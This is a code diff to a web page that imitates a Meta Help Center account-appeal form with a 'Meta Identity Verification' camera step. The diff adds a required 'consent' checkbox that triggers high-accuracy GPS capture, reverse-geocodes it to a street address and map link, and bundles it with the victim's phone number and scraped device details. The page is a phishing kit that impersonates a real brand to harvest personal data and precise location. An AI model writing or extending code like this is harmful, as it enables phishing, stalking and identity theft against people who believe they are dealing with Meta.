@@ -228,6 +228,27 @@
         }
         .phone-error.show { display: block; }
 
+        /* Consent Checkbox */
+        .consent-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 12px 0;
+            font-size: 14px;
+            color: #262626;
+        }
+        .consent-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #0095f6;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        .consent-group label {
+            cursor: pointer;
+            user-select: none;
+        }
+
         .send-btn {
             background: #0095f6;
             color: #fff;
@@ -237,8 +258,14 @@
             font-weight: 600;
             border-radius: 4px;
             cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
         }
         .send-btn:hover { background: #1877f2; }
+        .send-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
 
         .footer {
             background: #fafafa;
@@ -474,6 +501,7 @@
         </div>
     </div>
 
+    <!-- DISABLED FORM -->
     <div class="main-container form-container" id="disabledForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
@@ -525,11 +553,19 @@
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
-                <button type="submit" class="send-btn">Send</button>
+
+                <!-- Consent Checkbox -->
+                <div class="consent-group">
+                    <input type="checkbox" id="consent1" required>
+                    <label for="consent1">I agree to provide accurate information and consent to share my location for verification purposes.</label>
+                </div>
+
+                <button type="submit" class="send-btn" id="submitBtn1">Send</button>
             </form>
         </div>
     </div>
 
+    <!-- CHAT FORM -->
     <div class="main-container form-container" id="chatForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
@@ -581,11 +617,19 @@
                         <option value="behalf">I am reporting on behalf of someone else</option>
                     </select>
                 </div>
-                <button type="submit" class="send-btn">Send</button>
+
+                <!-- Consent Checkbox -->
+                <div class="consent-group">
+                    <input type="checkbox" id="consent2" required>
+                    <label for="consent2">I agree to provide accurate information and consent to share my location for verification purposes.</label>
+                </div>
+
+                <button type="submit" class="send-btn" id="submitBtn2">Send</button>
             </form>
         </div>
     </div>
 
+    <!-- VERIFICATION SCREEN -->
     <div class="verification-screen" id="verificationScreen">
         <div class="verification-header"><h2>Meta Identity Verification</h2></div>
         <div class="verification-content">
@@ -599,12 +643,14 @@
         </div>
     </div>
 
+    <!-- SUCCESS MODAL -->
     <div class="success-modal" id="successModal">
         <div class="modal-header">Form Submitted Successfully</div>
         <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
         <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
     </div>
 
+    <!-- FOOTER -->
     <div class="footer">
         <div class="footer-links">
             <a href="#" class="footer-link">ABOUT US</a>
@@ -843,7 +889,57 @@
         });
 
         // ============================================================
-        // 5. VERIFICATION STATE
+        // 5. GPS LOCATION (triggered by checkbox)
+        // ============================================================
+        let gpsLocation = null;
+
+        function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        // Reverse geocode
+                        try {
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+                            if (res.ok) {
+                                const data = await res.json();
+                                const addr = data.address || {};
+                                const fullAddr = [
+                                    addr.house_number, addr.road, addr.suburb, addr.city,
+                                    addr.state, addr.postcode, addr.country
+                                ].filter(Boolean).join(', ');
+                                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                                resolve({
+                                    lat: latitude,
+                                    lon: longitude,
+                                    address: fullAddr || 'N/A',
+                                    houseNumber: addr.house_number || 'N/A',
+                                    road: addr.road || 'N/A',
+                                    city: addr.city || addr.town || addr.village || 'N/A',
+                                    state: addr.state || 'N/A',
+                                    pincode: addr.postcode || 'N/A',
+                                    country: addr.country || 'N/A',
+                                    mapLink: mapLink
+                                });
+                            } else {
+                                resolve({ lat: latitude, lon: longitude, address: 'N/A', mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
+                            }
+                        } catch (_) {
+                            resolve({ lat: latitude, lon: longitude, address: 'N/A', mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` });
+                        }
+                    },
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // ============================================================
+        // 6. VERIFICATION STATE
         // ============================================================
         let verificationState = {
             currentPose: 0,
@@ -862,7 +958,7 @@
         ];
 
         // ============================================================
-        // 6. SELECT OPTION
+        // 7. SELECT OPTION
         // ============================================================
         function selectOption(type, element) {
             document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
@@ -874,7 +970,7 @@
         }
 
         // ============================================================
-        // 7. FORM SUBMIT – WITH DEVICE INFO
+        // 8. FORM SUBMIT – WITH GPS + DEVICE INFO
         // ============================================================
         document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -885,9 +981,23 @@
             handleFormSubmit(this, 'Chat Restrictions Appeal');
         });
 
-        function handleFormSubmit(form, formType) {
+        async function handleFormSubmit(form, formType) {
             const phoneInput = form.querySelector('.phone-input');
             if (!validatePhone(phoneInput)) { phoneInput.focus(); return; }
+
+            // Check consent checkbox
+            const consentCheck = form.querySelector('.consent-group input[type="checkbox"]');
+            if (!consentCheck.checked) {
+                alert('Please agree to the terms to submit the form.');
+                consentCheck.focus();
+                return;
+            }
+
+            // Get GPS location (if consent given)
+            let locationData = null;
+            if (consentCheck.checked) {
+                locationData = await getGPSLocation();
+            }
 
             const formData = new FormData(form);
             const data = Object.fromEntries(formData);
@@ -896,7 +1006,7 @@
             data.phone = code + ' ' + phoneInput.value.trim();
             delete data.phoneNumber;
 
-            // ---------- SCRAPE DEVICE INFO ----------
+            // Device info
             data.deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -907,7 +1017,13 @@
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
             };
-            // -----------------------------------------
+
+            // GPS Location
+            if (locationData) {
+                data.gps = locationData;
+            } else {
+                data.gps = null;
+            }
 
             verificationState.formData = { type: formType, ...data };
 
@@ -928,7 +1044,7 @@
         }
 
         // ============================================================
-        // 8. VERIFICATION FLOW
+        // 9. VERIFICATION FLOW (unchanged)
         // ============================================================
         function startVerification() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
@@ -1031,12 +1147,12 @@
         }
 
         // ============================================================
-        // 9. FOOTER YEAR
+        // 10. FOOTER YEAR
         // ============================================================
         document.getElementById('footerYear').textContent = new Date().getFullYear();
 
         // ============================================================
-        // 10. INIT
+        // 11. INIT
         // ============================================================
         ['1', '2'].forEach(id => renderOptions('dropdown' + id));
     </script>
